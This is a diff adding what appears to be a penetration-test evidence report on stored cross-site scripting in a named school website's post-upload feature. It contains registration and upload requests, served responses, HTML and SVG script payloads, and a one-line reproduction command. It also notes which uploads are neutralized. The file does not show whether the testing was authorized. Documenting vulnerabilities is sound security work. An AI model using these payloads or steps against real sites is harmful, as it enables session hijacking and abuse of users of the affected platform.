@@ -1,0 +1,54 @@
+# Report-3 — F5 Evidence: Stored XSS via unrestricted file upload (HTML / SVG)
+# Target: https://www.pedagogiai.smpm12gkb.sch.id
+# Captured: 2026-10-16 10:03 UTC
+# Account used: throwaway, created via OPEN self-registration (/register, role=siswa)
+# PII / secrets redacted.
+
+## 1. Open self-registration (enables any internet user to obtain an account)
+POST /register  (form-urlencoded)
+  _token=<REDACTED_CSRF>
+  role=siswa
+  name=POC PoC
+  email=<REDACTED_900>@gmail.com
+  password=<REDACTED_PW>
+  password_confirmation=<REDACTED_PW>
+=> 200 -> redirect /siswa  (authenticated session issued)
+
+## 2. Upload arbitrary .html via multipart photos[] (create-post flow)
+POST /social/posts  (multipart/form-data)
+  _token=<REDACTED_CSRF>
+  content=POC upload-xss   visibility=public   location=feed
+  photos[]; filename="evil.html"; Content-Type: text/html
+  <body> -> 200  (post persisted)   stored: /storage/posts/photos/wjeYJCqSjK5qWOZNgDwY1RgCade9npIjuKwt7q8j.html
+
+## 3. The uploaded .html is stored verbatim and served INLINE as text/html
+GET /storage/posts/photos/wjeYJCqSjK5qWOZNgDwY1RgCade9npIjuKwt7q8j.html
+  HTTP 200
+  Content-Type: text/html
+  Content-Security-Policy: upgrade-insecure-requests
+  body: <html><body><script>fetch('/komunitas').then(r=>r.text()).then(t=>{/* XSS: same-origin JS exec */});document.title='XSS';</script>POC-XSS</body></html>
+  >>> Served as text/html, JavaScript executes when a victim opens the URL (same-origin).
+
+## 4. Upload arbitrary .svg via multipart photos[] (create-post flow)
+POST /social/posts
+  photos[]; filename="evil.svg"; Content-Type: image/svg+xml
+  <body> -> 200   stored: /storage/posts/photos/MSA857aGQ0kXSP2hSzxZ8hVLRWeuMXQiOvxBcjFC.svg
+
+GET /storage/posts/photos/MSA857aGQ0kXSP2hSzxZ8hVLRWeuMXQiOvxBcjFC.svg
+  HTTP 200
+  Content-Type: image/svg+xml
+  Content-Security-Policy: upgrade-insecure-requests
+  body: <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><script>alert(1)</script></svg>
+  >>> Served as image/svg+xml with onload/script intact; executing SVG when opened.
+
+## 5. What the uploader DOES neutralize (defence-in-depth, honest scope)
+  - photos[] *.php / *.phtml (raw PHP) -> stored with NO extension, served non-executable
+      e.g. GET /storage/posts/photos/<hash>  -> 200  body: <?php ... ?>   (source, not executed)
+  - photos[] named .php but image content -> re-typed to .gif/.png (content sniffing)
+  - document field -> forced extension .pdf, served application/pdf (content NOT re-encoded)
+  => No RCE via upload. The exploitable primitive is client-side (HTML/SVG stored XSS).
+
+## 6. Reproduction (one command)
+  poc/poc_upload_xss.py --url https://www.pedagogiai.smpm12gkb.sch.id --register \
+      --file evil.html --field photos[]      # stored -> text/html -> XSS
+      # or: --file evil.svg --field photos[] # stored -> image/svg+xml -> XSS
